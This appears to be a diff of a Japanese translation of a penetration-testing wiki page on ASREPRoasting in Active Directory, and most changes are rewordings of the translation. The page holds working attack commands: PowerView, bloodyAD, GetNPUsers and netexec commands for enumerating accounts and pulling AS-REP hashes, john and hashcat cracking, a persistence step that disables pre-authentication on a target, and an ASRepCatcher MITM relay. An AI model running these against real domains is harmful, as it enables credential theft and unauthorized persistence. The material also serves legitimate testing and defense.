@@ -4,15 +4,15 @@
 
 ## ASREPRoast
 
-ASREPRoastは、**Kerberos pre-authentication required attribute**を持たないユーザーを悪用するセキュリティ攻撃です。具体的には、この脆弱性により攻撃者はユーザーのpasswordを知らなくてもDomain Controller (DC)に対してそのユーザーの認証を要求できます。DCはユーザーのpasswordから派生したキーで暗号化されたメッセージを返し、攻撃者はそれをofflineでクラックしてユーザーのpasswordを見つけようとします。
+ASREPRoastは、**Kerberos pre-authentication required attribute** を持たないユーザーを悪用するセキュリティ攻撃です。基本的に、この脆弱性により攻撃者はユーザーのパスワードを必要とせずにDomain Controller (DC) に対してそのユーザーの認証を要求できます。DCは次に、ユーザーのパスワードから派生した鍵で暗号化されたメッセージを返し、攻撃者はそのメッセージをオフラインで解析してパスワードを解読しようと試みることができます。
 
-主な前提条件は以下のとおりです:
+この攻撃の主な要件は次のとおりです:
 
-- **Lack of Kerberos pre-authentication**: ターゲットユーザーはこのセキュリティ機能を有効にしていない必要があります。
-- **Connection to the Domain Controller (DC)**: 攻撃者はリクエストを送信し暗号化されたメッセージを受信するためにDCへのアクセスが必要です。
-- **Optional domain account**: domain accountを持っていると、LDAPクエリで脆弱なユーザーをより効率的に特定できます。そうしたアカウントがない場合、攻撃者はユーザー名を推測する必要があります。
+- **Kerberos pre-authentication の欠如**: 対象ユーザーはこのセキュリティ機能が有効になっていない必要があります。
+- **Domain Controller (DC) への接続**: 攻撃者はリクエストを送信し暗号化されたメッセージを受信するためにDCへのアクセスが必要です。
+- **オプションのドメインアカウント**: ドメインアカウントがあれば、LDAPクエリを通じて脆弱なユーザーをより効率的に特定できます。そうしたアカウントがない場合、攻撃者はユーザー名を推測する必要があります。
 
-#### 脆弱なユーザーの列挙 (need domain credentials)
+#### Enumerating vulnerable users (need domain credentials)
 ```bash:Using Windows
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
@@ -20,7 +20,7 @@ Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```bash:Using Linux
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
-#### AS_REP メッセージを要求する
+#### AS_REP メッセージを要求
 ```bash:Using Linux
 #Try all the usernames in usernames.txt
 python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
@@ -33,22 +33,22 @@ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashc
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
 ```
 > [!WARNING]
-> AS-REP Roasting with Rubeus は暗号化タイプ0x17、preauthタイプ0の4768を生成します。
+> AS-REP Roasting with Rubeus は 0x17 の encryption type と 0 の preauth type を持つ 4768 を生成します。
 
-#### Quick one-liners (Linux)
+#### クイックワンライナー (Linux)
 
-- まず潜在的なターゲットを列挙します（例: leaked build paths から）Kerberos userenum で: `kerbrute userenum users.txt -d domain --dc dc.domain`
-- 単一ユーザーの AS-REP を空のパスワードでも取得するには `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` を使用します（netexec は LDAP signing/channel binding posture も表示します）。
-- `hashcat out.asreproast /path/rockyou.txt` でクラックします — AS-REP roast ハッシュに対して **-m 18200** (etype 23) を自動検出します。
+- 最初に潜在的なターゲットを列挙します（例: leaked build paths から）Kerberos userenum を使用: `kerbrute userenum users.txt -d domain --dc dc.domain`
+- 単一ユーザーの AS-REP を、パスワードが **空** の場合でも取得できます: `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast`（netexec は LDAP の signing/channel binding posture も表示します）。
+- `hashcat out.asreproast /path/rockyou.txt` でクラックします – AS-REP roast ハッシュに対して **-m 18200** (etype 23) を自動検出します。
 
-### クラック
+### Cracking
 ```bash
 john --wordlist=passwords_kerb.txt hashes.asreproast
 hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
 ### Persistence
 
-あなたが **GenericAll** 権限（またはプロパティを書き込む権限）を持つユーザーに対して、Force **preauth** を不要にする:
+**GenericAll** 権限（またはプロパティを書き込む権限）を持つユーザーに対して、**preauth** を不要に強制的に設定する:
 ```bash:Using Windows
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
@@ -56,10 +56,10 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 ```bash:Using Linux
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
 ```
-## ASREProast 資格情報なし
+## ASREProast without credentials
 
-攻撃者は man-in-the-middle の位置を利用して、Kerberos pre-authentication が無効化されていることに依存せずにネットワークを横断する AS-REP パケットを捕獲できます。したがって、VLAN 上のすべてのユーザーに対して機能します.\
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) を使うことでこれが可能です。さらに、このツールは Kerberos のネゴシエーションを改変してクライアントワークステーションに RC4 を使用させます。
+攻撃者はman-in-the-middleのポジションを利用して、ネットワークを横断するAS-REP packetsを、Kerberos pre-authenticationが無効になっていることに頼らずにキャプチャできます。したがって、VLAN上のすべてのユーザーに対して機能します。\
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)によりこれが可能です。さらに、このツールはKerberos negotiationを改変してクライアントワークステーションにRC4を使用させます。
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
